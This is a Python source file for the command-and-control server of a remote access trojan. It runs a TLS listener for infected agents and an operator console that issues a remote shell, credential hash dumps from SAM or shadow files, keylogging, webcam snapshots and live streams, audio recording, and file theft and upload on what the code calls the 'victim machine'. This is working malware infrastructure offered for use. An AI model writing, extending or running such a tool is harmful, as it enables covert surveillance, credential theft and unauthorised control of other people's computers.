"""
RAT Server - Remote Administration Tool.

Listens for incoming agent connections via a TLS-encrypted TCP socket.
Supports multiple agents in parallel using threads.
Interactive command-line interface to control agents.
"""

import base64
import socket
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any

from rat_project.common.protocol import decode_message, encode_message, recv_message
from rat_project.common.tls import create_server_ssl_context
from rat_project.utils.logger_config import setup_logger

HOST = "0.0.0.0"
PORT = 8888

logger = setup_logger("server")

# Active sessions dictionary: {session_id: {conn, ip, port, hostname, os, release}}
sessions: dict[int, dict[str, Any]] = {}
session_lock = threading.Lock()
session_counter = 0


# ---------------------------------------------------------------------------
# Session management
# ---------------------------------------------------------------------------


def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[str, Any]) -> int:
    """
    Registers a new agent in the sessions dictionary.

    Args:
        conn: Agent TLS socket.
        addr: Tuple (ip, port) of the agent.
        payload: Registration dictionary sent by the agent.

    Returns:
        int: Unique identifier of the created session.
    """
    global session_counter

    with session_lock:
        session_counter += 1
        session_id = session_counter
        sessions[session_id] = {
            "conn": conn,
            "ip": addr[0],
            "port": addr[1],
            "hostname": payload.get("hostname", "unknown"),
            "os": payload.get("os", "unknown"),
            "release": payload.get("release", "unknown"),
        }

    logger.info(
        "Session %s registered: %s:%s | %s | %s %s",
        session_id,
        addr[0],
        addr[1],
        payload.get("hostname", "unknown"),
        payload.get("os", "unknown"),
        payload.get("release", "unknown"),
    )
    return session_id


def remove_session(session_id: int) -> None:
    """
    Removes a session from the active sessions dictionary.

    Args:
        session_id: Identifier of the session to remove.
    """
    with session_lock:
        if session_id in sessions:
            del sessions[session_id]
            logger.info("Session %s removed", session_id)


def get_session(session_id: int) -> dict[str, Any] | None:
    """
    Retrieves a session's data by its identifier.

    Args:
        session_id: Session identifier.

    Returns:
        dict or None if the session does not exist.
    """
    with session_lock:
        return sessions.get(session_id)


def print_sessions() -> None:
    """Prints the list of active sessions to the console."""
    with session_lock:
        if not sessions:
            print("[*] No agent connected.")
            return

        print("[*] Active sessions:")
        for sid, data in sessions.items():
            print(
                f"    Agent {sid} | {data['ip']}:{data['port']} "
                f"| {data['hostname']} | {data['os']} {data['release']}"
            )


# ---------------------------------------------------------------------------
# Incoming connection handling
# ---------------------------------------------------------------------------


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    """
    Handles an agent connection from a dedicated thread.

    Waits for the registration message, creates the session,
    then keeps the connection open until disconnection.

    Args:
        conn: Agent TLS socket.
        addr: Tuple (ip, port) of the agent.
    """
    session_id = None

    try:
        logger.info("Incoming connection from %s:%s", addr[0], addr[1])

        # First message: registration required
        payload = recv_message(conn)

        if payload.get("type") != "register":
            logger.warning("Invalid first message from %s:%s: %s", addr[0], addr[1], payload)
            conn.sendall(
                encode_message({"type": "error", "message": "First message must be 'register'"})
            )
            return

        session_id = register_session(conn, addr, payload)
        print(f"\n[+] Agent {session_id} connected ({addr[0]} | {payload.get('hostname', '?')})")
        print("rat > ", end="", flush=True)

        # Send acknowledgement to the agent
        conn.sendall(
            encode_message(
                {
                    "type": "ack",
                    "message": f"session {session_id} registered",
                    "session_id": session_id,
                }
            )
        )

        # Keep connection open (commands are sent from interact_with_session)
        while get_session(session_id) is not None:
            time.sleep(0.2)

    except Exception as exc:
        logger.exception("Error with agent %s:%s: %s", addr[0], addr[1], exc)

    finally:
        if session_id is not None:
            remove_session(session_id)
            print(f"\n[-] Agent {session_id} disconnected")
            print("rat > ", end="", flush=True)
        conn.close()
        logger.info("Connection closed for %s:%s", addr[0], addr[1])


def accept_clients(server_socket: socket.socket) -> None:
    """
    Accepts incoming connections in a loop (runs in a daemon thread).

    Each new agent is handled in a separate thread.

    Args:
        server_socket: Listening TLS server socket.
    """
    while True:
        try:
            conn, addr = server_socket.accept()
            logger.info("New TLS connection accepted from %s:%s", addr[0], addr[1])

            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()

        except Exception as exc:
            logger.exception("Error accepting connection: %s", exc)


# ---------------------------------------------------------------------------
# Interface interactive agent
# ---------------------------------------------------------------------------

def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None = None) -> dict[str, Any]:
    message: dict[str, Any] = {"type": "command", "command": command}
    if extra:
        message.update(extra)
    conn.sendall(encode_message(message))
    return recv_message(conn)


def interact_with_session(session_id: int, port: int = PORT) -> None:
    """
    Opens an interactive session with an agent.

    Allows sending commands and receiving results.
    Type 'back' to return to the main menu.

    Args:
        session_id: Target session identifier.
        port: Server port (shown in the TUI header).
    """
    from rat_project.app.tui import _c, draw_agent_screen

    session = get_session(session_id)

    if session is None:
        print(f"[!] Session {session_id} not found.")
        return

    logger.info("Interaction opened with session %s", session_id)
    conn = session["conn"]
    last_output = None  # last command output to display in the right panel

    while True:
        try:
            draw_agent_screen(session_id, port, last_output)
            command = input(_c(f"rat agent {session_id} > ")).strip()

            if not command:
                continue

            if command == "back":
                logger.info("Returning to main menu from session %s", session_id)
                break

            if command == "help":
                last_output = [
                    "Available commands:",
                    "",
                    "  sysinfo           System information",
                    "  ipconfig          Network configuration",
                    "  screenshot        Take a screenshot",
                    "  shell             Interactive shell (bash/cmd)",
                    "  search <name>     Search for a file",
                    "  download <path>   Download a file from agent",
                    "  upload <path>     Upload a file to agent",
                    "  hashdump          Dump SAM (Win) or shadow (Linux)",
                    "  keylogger         Start/stop keylogger",
                    "  webcam_snapshot   Webcam photo",
                    "  webcam_stream     Live webcam stream (q to stop)",
                    "  record_audio [s]  Audio recording (default: 5s)",
                    "  back              Return to main menu",
                ]
                continue

            # --- Simple commands (no parameter) ---
            if command in (
                "sysinfo",
                "ipconfig",
                "hashdump",
                "keylogger",
            ):
                response = send_command_and_recv(conn, command)
                last_output = _response_to_lines(response)

            # --- Commands that save an image ---
            elif command in ("screenshot", "webcam_snapshot"):
                response = send_command_and_recv(conn, command)
                _save_image(response, command)
                last_output = _response_to_lines(response)

            # --- record_audio [optional duration] ---
            elif command.startswith("record_audio"):
                parts = command.split(maxsplit=1)
                duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                response = send_command_and_recv(conn, "record_audio", {"duration": duration})
                _save_audio(response)
                last_output = ["Audio recorded and saved."]

            # --- Webcam stream ---
            elif command == "webcam_stream":
                _webcam_stream_session(conn, session_id)
                last_output = ["Webcam stream ended."]

            # --- Interactive shell ---
            elif command == "shell":
                _shell_session(conn, session_id)
                last_output = ["Shell session ended."]

            # --- File search ---
            elif command.startswith("search "):
                filename = command.split(maxsplit=1)[1]
                response = send_command_and_recv(conn, "search", {"filename": filename})
                last_output = _response_to_lines(response)

            # --- Download (agent → server) ---
            elif command.startswith("download "):
                remote_path = command.split(maxsplit=1)[1]
                _download_file(conn, remote_path)
                last_output = [f"Download of '{remote_path}' done."]

            # --- Upload (server → agent) ---
            elif command.startswith("upload "):
                local_path = command.split(maxsplit=1)[1]
                _upload_file(conn, local_path, session_id)
                last_output = [f"Upload of '{local_path}' done."]

            else:
                logger.warning("Unknown agent command: %s", command)
                last_output = [f"[!] Unknown command: '{command}'", "", "Type 'help' for the list."]

        except KeyboardInterrupt:
            print()
            break
        except (BrokenPipeError, ConnectionResetError, OSError):
            print(f"\n[-] Agent {session_id} disconnected.")
            remove_session(session_id)
            break
        except Exception as exc:
            logger.exception("Error in session %s: %s", session_id, exc)
            last_output = [f"[!] Error: {exc}"]


def _response_to_lines(response: dict[str, Any]) -> list[str]:
    """Converts an agent response into lines for the TUI right panel."""
    lines = []
    output = response.get("output", "")
    error = response.get("error", "")
    if output:
        lines.extend(output.splitlines())
    if error:
        lines.append(f"[!] Agent error: {error}")
    if not lines:
        lines.append("[*] Command executed (no output).")
    return lines


def _save_image(response: dict[str, Any], command: str) -> None:
    """Saves the image from an agent response (screenshot / webcam_snapshot)."""
    data = response.get("data")
    if data:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{command}_{timestamp}.jpg"
        Path(filename).write_bytes(base64.b64decode(data))
        logger.info("Image saved: %s", filename)


def _shell_session(conn: socket.socket, session_id: int) -> None:
    """
    Starts an interactive shell with the agent.

    Sends commands one by one and displays the result.
    Type 'exit' to quit the shell.

    Args:
        conn: Agent TLS socket.
        session_id: Session identifier (for logs).
    """
    print("[*] Interactive shell opened. Type 'exit' to quit.")
    conn.sendall(encode_message({"type": "command", "command": "shell_start"}))

    while True:
        try:
            cmd = input("shell > ").strip()
            if cmd == "exit":
                conn.sendall(encode_message({"type": "command", "command": "shell_stop"}))
                break
            if not cmd:
                continue

            conn.sendall(encode_message({"type": "shell_input", "input": cmd}))
            response = recv_message(conn)
            print(response.get("output", ""), end="")

        except KeyboardInterrupt:
            conn.sendall(encode_message({"type": "command", "command": "shell_stop"}))
            break


def _webcam_stream_session(conn: socket.socket, session_id: int) -> None:
    """
    Receive and display live webcam frames from the agent.

    Sends the webcam_stream command, then loops receiving base64 JPEG frames
    and displays them with cv2.imshow(). Press 'q' or Ctrl+C to stop.

    Args:
        conn: TLS socket of the agent.
        session_id: Session identifier (for logs).
    """
    import cv2
    import numpy as np

    print("[*] Webcam stream started. Press 'q' in the window to stop.")
    conn.sendall(encode_message({"type": "command", "command": "webcam_stream"}))

    try:
        while True:
            response = recv_message(conn)

            if response.get("type") == "stream_error":
                print(f"[!] Stream error: {response.get('error')}")
                break

            encoded = response.get("data", "")
            if not encoded:
                break

            # Decode base64 → bytes → numpy array → OpenCV frame
            frame_bytes = base64.b64decode(encoded)
            frame_array = np.frombuffer(frame_bytes, dtype=np.uint8)
            frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)

            cv2.imshow("Webcam Stream", frame)

            # 'q' stops the stream
            if cv2.waitKey(1) & 0xFF == ord("q"):
                conn.sendall(encode_message({"type": "stream_stop"}))
                break

    except KeyboardInterrupt:
        conn.sendall(encode_message({"type": "stream_stop"}))
        print()

    finally:
        cv2.destroyAllWindows()
        logger.info("Webcam stream ended for session %s", session_id)
        print("[*] Webcam stream stopped.")


def _download_file(conn: socket.socket, remote_path: str) -> None:
    """
    Downloads a file from the agent to the server.

    Args:
        conn: Agent TLS socket.
        remote_path: Path of the file on the victim machine.
    """
    conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
    response = recv_message(conn)

    if response.get("error"):
        print(f"[!] {response['error']}")
        return

    file_data = base64.b64decode(response["data"])
    filename = Path(remote_path).name
    save_path = Path("downloads") / filename
    save_path.parent.mkdir(exist_ok=True)
    save_path.write_bytes(file_data)
    print(f"[+] File saved: {save_path} ({len(file_data)} bytes)")
    logger.info("File downloaded: %s → %s", remote_path, save_path)


def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
    """
    Sends a local file to the agent.

    Args:
        conn: Agent TLS socket.
        local_path: Local path of the file to send.
        session_id: Session identifier (for logs).
    """
    path = Path(local_path)
    if not path.exists():
        print(f"[!] File not found: {local_path}")
        return

    file_data = base64.b64encode(path.read_bytes()).decode("utf-8")
    conn.sendall(
        encode_message(
            {
                "type": "command",
                "command": "upload",
                "filename": path.name,
                "data": file_data,
            }
        )
    )

    response = recv_message(conn)
    print(response.get("output", "[?] Unexpected response"))
    logger.info("File uploaded to session %s: %s", session_id, local_path)


def _save_audio(response: dict[str, Any]) -> None:
    """
    Decode the base64 WAV data from a record_audio response and save it locally.

    The file is saved in a 'recordings/' folder with a timestamp in the name.

    Args:
        response: Agent response dict containing 'data' (base64 WAV) or 'error'.
    """
    if response.get("error"):
        print(f"[!] record_audio error: {response['error']}")
        return

    raw_data = response.get("data", "")
    if not raw_data:
        print("[!] No audio data received.")
        return

    wav_bytes = base64.b64decode(raw_data)

    save_dir = Path("recordings")
    save_dir.mkdir(exist_ok=True)

    filename = save_dir / f"audio_{int(time.time())}.wav"
    filename.write_bytes(wav_bytes)

    print(f"[+] Audio saved: {filename} ({len(wav_bytes)} bytes)")
    logger.info("Audio recording saved to %s", filename)


# ---------------------------------------------------------------------------
# Main server loop
# ---------------------------------------------------------------------------


def command_loop() -> None:
    """
    Interactive command loop of the server.

    Available commands: help, sessions, interact <id>, exit.
    """
    while True:
        try:
            command = input("rat > ").strip()

            if not command:
                continue

            if command == "help":
                print("Available commands:")
                print("  help              - Show this menu")
                print("  sessions          - List connected agents")
                print("  interact <id>     - Interact with an agent")
                print("  exit              - Stop the server")

            elif command == "sessions":
                print_sessions()

            elif command.startswith("interact "):
                _, session_id_str = command.split(maxsplit=1)
                if not session_id_str.isdigit():
                    logger.warning("Invalid session ID: %s", session_id_str)
                    print("[!] Session ID must be a number.")
                    continue
                interact_with_session(int(session_id_str))

            elif command == "exit":
                logger.info("Server shutting down.")
                print("[*] Shutting down server...")
                break

            else:
                logger.warning("Unknown server command: %s", command)
                print("[!] Unknown command. Type 'help'.")

        except KeyboardInterrupt:
            logger.info("Server interrupted by user.")
            print("\n[*] Shutting down server...")
            break
        except Exception as exc:
            logger.exception("Error in command loop: %s", exc)
            print(f"[!] Unexpected error: {exc}")


def run_server() -> None:
    """
    RAT server entry point.

    Creates the TCP socket, applies the TLS context,
    starts the accept thread and launches the interactive loop.
    """
    ssl_context = create_server_ssl_context()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
            raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            raw_socket.bind((HOST, PORT))
            raw_socket.listen(5)

            # Wrap the server socket with TLS
            with ssl_context.wrap_socket(raw_socket, server_side=True) as server_socket:
                logger.info("Server listening on %s:%s (TLS enabled)", HOST, PORT)
                print(f"[*] Listening on {PORT}... (TLS)")

                accept_thread = threading.Thread(target=accept_clients, args=(server_socket,), daemon=True)
                accept_thread.start()

                from rat_project.app.tui import tui_loop
                tui_loop(port=PORT)

    except Exception as exc:
        logger.exception("Fatal server error: %s", exc)


if __name__ == "__main__":
    run_server()
